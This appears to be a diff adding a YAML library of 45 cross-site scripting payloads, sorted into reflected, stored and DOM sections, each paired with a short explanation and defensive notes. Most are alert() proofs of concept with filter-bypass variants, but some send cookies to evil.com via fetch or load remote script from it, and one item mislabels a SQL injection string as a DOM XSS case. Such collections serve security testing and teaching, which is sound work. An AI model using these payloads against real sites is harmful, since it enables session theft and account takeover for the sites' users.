@@ -1,0 +1,352 @@
+
+# ================================================================================================== #
+# SECTION 1: REFLECTED XSS (15 Payloads) - Basic to Intermediate
+# Context: HTML, Attribute, JavaScript, URL
+# Bypass Techniques: Basic, Encoding, Case Manipulation, Tag Switching
+# ================================================================================================== #
+
+- id: xss-ref-001
+  context: html
+  type: reflected
+  payload: "<script>alert('XSS')</script>"
+  explanation: "Classic reflected XSS. Input echoes directly into HTML without encoding."
+  defensive_notes: "HTML encode all user output. Use Content-Security-Policy script-src."
+
+- id: xss-ref-002
+  context: html
+  type: reflected
+  payload: "<img src=x onerror=alert('XSS')>"
+  explanation: "Image tag with broken src triggers onerror event handler."
+  defensive_notes: "Remove inline event handlers. Use CSP to disallow unsafe-inline."
+
+- id: xss-ref-003
+  context: html
+  type: reflected
+  payload: "<svg onload=alert('XSS')>"
+  explanation: "SVG tags support script execution via onload events."
+  defensive_notes: "Whitelist allowed HTML tags. Sanitize SVG content."
+
+- id: xss-ref-004
+  context: attribute
+  type: reflected
+  payload: "\" onmouseover=alert('XSS') x=\""
+  explanation: "Breaks out of quoted attribute value and injects event handler."
+  defensive_notes: "Escape quotes with &quot;. Use parameterized templates."
+
+- id: xss-ref-005
+  context: javascript
+  type: reflected
+  payload: "';alert('XSS');//"
+  explanation: "Closes JavaScript string, injects code, comments out rest."
+  defensive_notes: "Never embed user input directly in script blocks. Use JSON."
+
+- id: xss-ref-006
+  context: html
+  type: reflected
+  payload: "%3Cscript%3Ealert('XSS')%3C/script%3E"
+  explanation: "URL encoded payload bypasses basic input filters."
+  defensive_notes: "Normalize and decode input before validation."
+
+- id: xss-ref-007
+  context: html
+  type: reflected
+  payload: "<ScRiPt>alert('XSS')</ScRiPt>"
+  explanation: "Mixed case bypasses case-sensitive blacklist filters."
+  defensive_notes: "Use case-insensitive filtering or whitelist approach."
+
+- id: xss-ref-008
+  context: html
+  type: reflected
+  payload: "<iframe src=javascript:alert('XSS')>"
+  explanation: "Iframe with javascript: scheme executes in older browsers."
+  defensive_notes: "Block javascript: protocol. Use sandbox attribute."
+
+- id: xss-ref-009
+  context: html
+  type: reflected
+  payload: "<object data=javascript:alert('XSS')>"
+  explanation: "Object tag alternative for JavaScript execution."
+  defensive_notes: "Restrict object and embed tags. Validate protocols."
+
+- id: xss-ref-010
+  context: attribute
+  type: reflected
+  payload: "' autofocus onfocus=alert('XSS') '"
+  explanation: "Injects autofocus and onfocus to trigger without click."
+  defensive_notes: "Remove autofocus attribute. Disable inline events."
+
+- id: xss-ref-011
+  context: html
+  type: reflected
+  payload: "<video><source onerror=alert('XSS')>"
+  explanation: "Video source error triggers JavaScript execution."
+  defensive_notes: "Strip all on* attributes. Use DOMPurify."
+
+- id: xss-ref-012
+  context: javascript
+  type: reflected
+  payload: "\"+alert('XSS')+\""
+  explanation: "String concatenation injection in JavaScript context."
+  defensive_notes: "Avoid dynamic JavaScript generation. Use textContent."
+
+- id: xss-ref-013
+  context: html
+  type: reflected
+  payload: "<details open ontoggle=alert('XSS')>"
+  explanation: "Details element with ontoggle fires when opened."
+  defensive_notes: "Blacklist ontoggle and similar uncommon events."
+
+- id: xss-ref-014
+  context: html
+  type: reflected
+  payload: "<math><script>alert('XSS')</script></math>"
+  explanation: "MathML namespace allows script execution in some browsers."
+  defensive_notes: "Sanitize MathML tags or remove entirely."
+
+- id: xss-ref-015
+  context: html
+  type: reflected
+  payload: "<input value=\"\"><script>alert('XSS')</script>"
+  explanation: "Closes input tag and injects new script element."
+  defensive_notes: "HTML encode all user input. Never trust input length."
+
+
+
+# ================================================================================================== #
+# SECTION 2: STORED XSS (15 Payloads) - Basic to Intermediate
+# Context: HTML, Attribute, JavaScript
+# Persistence: Database, Comments, Profiles, Messages
+# ================================================================================================== #
+
+- id: xss-stored-001
+  context: html
+  type: stored
+  payload: "<script>alert(document.cookie)</script>"
+  explanation: "Persistent payload steals cookies when page is viewed."
+  defensive_notes: "HttpOnly flag prevents cookie access. Sanitize input."
+
+- id: xss-stored-002
+  context: html
+  type: stored
+  payload: "<img src=x onerror=alert('stored')>"
+  explanation: "Stored in database, executes for every visitor."
+  defensive_notes: "Output encoding on display, not just input validation."
+
+- id: xss-stored-003
+  context: attribute
+  type: stored
+  payload: "\" onclick=alert('admin') \""
+  explanation: "Stored click handler executes when element is clicked."
+  defensive_notes: "Escape quotes and strip event attributes."
+
+- id: xss-stored-004
+  context: html
+  type: stored
+  payload: "&#60;script&#62;alert('XSS')&#60;/script&#62;"
+  explanation: "HTML entity encoded payload may decode in some contexts."
+  defensive_notes: "Context-aware decoding before validation."
+
+- id: xss-stored-005
+  context: html
+  type: stored
+  payload: "<ScRiPt src='http://evil.com/xss.js'></ScRiPt>"
+  explanation: "Stored remote script loads external malicious code."
+  defensive_notes: "CSP with script-src 'none' or nonces. Whitelist domains."
+
+- id: xss-stored-006
+  context: html
+  type: stored
+  payload: "<iframe srcdoc='<script>alert(1)</script>'>"
+  explanation: "Srcdoc attribute contains embedded script."
+  defensive_notes: "Sanitize iframe srcdoc content. Restrict iframe usage."
+
+- id: xss-stored-007
+  context: attribute
+  type: stored
+  payload: "' onfocus=alert(1) autofocus='"
+  explanation: "Stored in profile field, auto-executes on page load."
+  defensive_notes: "Remove autofocus. Validate attribute names."
+
+- id: xss-stored-008
+  context: html
+  type: stored
+  payload: "<body onload=alert('XSS')>"
+  explanation: "Body onload fires immediately when page renders."
+  defensive_notes: "Strip onload from all user-supplied HTML."
+
+- id: xss-stored-009
+  context: javascript
+  type: stored
+  payload: "';fetch('https://evil.com/steal?cookie='+document.cookie)//"
+  explanation: "Stored JavaScript steals data via fetch API."
+  defensive_notes: "CSP connect-src restrictions. HttpOnly cookies."
+
+- id: xss-stored-010
+  context: html
+  type: stored
+  payload: "<details ontoggle=alert('stored') open>"
+  explanation: "Stored in comment, executes when details expands."
+  defensive_notes: "Filter HTML5 event handlers. Use whitelist."
+
+- id: xss-stored-011
+  context: html
+  type: stored
+  payload: "<audio src=x onerror=alert('XSS')>"
+  explanation: "Audio element error handler executes JavaScript."
+  defensive_notes: "Remove onerror from all media elements."
+
+- id: xss-stored-012
+  context: html
+  type: stored
+  payload: "<link rel=import href='data:text/html,<script>alert(1)</script>'>"
+  explanation: "HTML imports can execute scripts from data URLs."
+  defensive_notes: "Disable HTML imports. Block data: URLs."
+
+- id: xss-stored-013
+  context: html
+  type: stored
+  payload: "<form id=test><button formaction=javascript:alert(1)>"
+  explanation: "Form button with javascript action executes on click."
+  defensive_notes: "Disallow javascript: URLs in form actions."
+
+- id: xss-stored-014
+  context: html
+  type: stored
+  payload: "<textarea></textarea><script>alert('stored')</script>"
+  explanation: "Closes textarea, injects script in different context."
+  defensive_notes: "Parse HTML properly. Don't use regex for filtering."
+
+- id: xss-stored-015
+  context: html
+  type: stored
+  payload: "<meta http-equiv=refresh content='0;javascript:alert(1)'>"
+  explanation: "Meta refresh with JavaScript executes immediately."
+  defensive_notes: "Disable meta refresh. Block javascript: in meta."
+
+
+
+# ================================================================================================== #
+# SECTION 3: DOM XSS (15 Payloads) - Basic to Intermediate
+# Context: JavaScript Sinks (document.write, innerHTML, eval, location)
+# Source: URL hash, search parameters, document.referrer, window.name
+# ================================================================================================== #
+
+- id: xss-dom-001
+  context: javascript
+  type: dom
+  payload: "#<img src=x onerror=alert('DOM')>"
+  sink: "element.innerHTML = location.hash"
+  explanation: "Hash fragment written to innerHTML creates DOM XSS."
+  defensive_notes: "Use textContent instead of innerHTML. Sanitize hash."
+
+- id: xss-dom-002
+  context: javascript
+  type: dom
+  payload: "?name=<img src=x onerror=alert(document.cookie)>"
+  sink: "document.write(location.search)"
+  explanation: "document.write with untrusted URL parameter creates XSS."
+  defensive_notes: "Avoid document.write. Use safe DOM APIs."
+
+- id: xss-dom-003
+  context: javascript
+  type: dom
+  payload: "javascript:alert('DOM XSS')"
+  sink: "location.href = userInput"
+  explanation: "javascript: URL scheme executes when assigned to location."
+  defensive_notes: "Validate and whitelist URL protocols. Block javascript:."
+
+- id: xss-dom-004
+  context: javascript
+  type: dom
+  payload: "?callback=alert(1)"
+  sink: "eval(location.search.split('=')[1])"
+  explanation: "eval() executes attacker-controlled JavaScript code."
+  defensive_notes: "Never use eval(). Use JSON.parse for data."
+
+- id: xss-dom-005
+  context: javascript
+  type: dom
+  payload: "#<svg onload=alert(1)>"
+  sink: "element.outerHTML = location.hash"
+  explanation: "outerHTML sink replaces element with malicious SVG."
+  defensive_notes: "Avoid outerHTML with untrusted input."
+
+- id: xss-dom-006
+  context: javascript
+  type: dom
+  payload: "\"+fetch('https://evil.com/steal?c='+btoa(document.cookie))+\""
+  sink: "setTimeout('console.log(\"' + userInput + '\")')"
+  explanation: "setTimeout with string argument evaluates JavaScript."
+  defensive_notes: "Pass functions, not strings to setTimeout/setInterval."
+
+- id: xss-dom-007
+  context: javascript
+  type: dom
+  payload: "?<img src=x onerror=alert(1)>"
+  sink: "document.write(decodeURIComponent(location.search))"
+  explanation: "URL decoded parameter passed to dangerous sink."
+  defensive_notes: "Decode then validate. Never trust decoded input."
+
+- id: xss-dom-008
+  context: javascript
+  type: dom
+  payload: "#javascript:alert('hash')"
+  sink: "location.href = window.location.hash.substring(1)"
+  explanation: "Hash value used as navigation destination."
+  defensive_notes: "Whitelist allowed hash formats. Strip javascript:."
+
+- id: xss-dom-009
+  context: javascript
+  type: dom
+  payload: "?name=<script>alert(1)</script>"
+  sink: "element.innerHTML = new URL(location).searchParams.get('name')"
+  explanation: "URLSearchParams provides attacker-controlled input to innerHTML."
+  defensive_notes: "Use textContent, not innerHTML. Sanitize URL parameters."
+
+- id: xss-dom-010
+  context: javascript
+  type: dom
+  payload: "?json={\"name\":\"<img src=x onerror=alert(1)>\"}"
+  sink: "document.getElementById('output').innerHTML = JSON.parse(userInput).name"
+  explanation: "JSON parsed data written directly to innerHTML."
+  defensive_notes: "Sanitize JSON values before DOM insertion."
+
+- id: xss-dom-011
+  context: javascript
+  type: dom
+  payload: "?redirect=javascript:alert('DOM')"
+  sink: "window.location = getParameter('redirect')"
+  explanation: "Open redirect becomes XSS with javascript: protocol."
+  defensive_notes: "Whitelist redirect destinations. Block javascript:."
+
+- id: xss-dom-012
+  context: javascript
+  type: dom
+  payload: "?html=<iframe srcdoc='<script>alert(1)</script>'>"
+  sink: "element.insertAdjacentHTML('beforeend', userHTML)"
+  explanation: "insertAdjacentHTML parses and executes malicious HTML."
+  defensive_notes: "Use insertAdjacentText instead. Sanitize HTML."
+
+- id: xss-dom-013
+  context: javascript
+  type: dom
+  payload: "?name=Robert'); DROP TABLE users;--"
+  sink: "new Function('return ' + userInput)()"
+  explanation: "Function constructor similar to eval, executes code."
+  defensive_notes: "Avoid Function constructor with user input."
+
+- id: xss-dom-014
+  context: javascript
+  type: dom
+  payload: "#<img src=1 onerror=alert(document.domain)>"
+  sink: "range.createContextualFragment(location.hash)"
+  explanation: "createContextualFragment parses and executes scripts."
+  defensive_notes: "Sanitize HTML before creating fragments."
+
+- id: xss-dom-015
+  context: javascript
+  type: dom
+  payload: "?postMessage=<img src=x onerror=alert(1)>"
+  sink: "window.addEventListener('message', function(e) { element.innerHTML = e.data; })"
+  explanation: "postMessage data written to innerHTML without validation."
+  defensive_notes: "Validate postMessage origin. Sanitize message data."
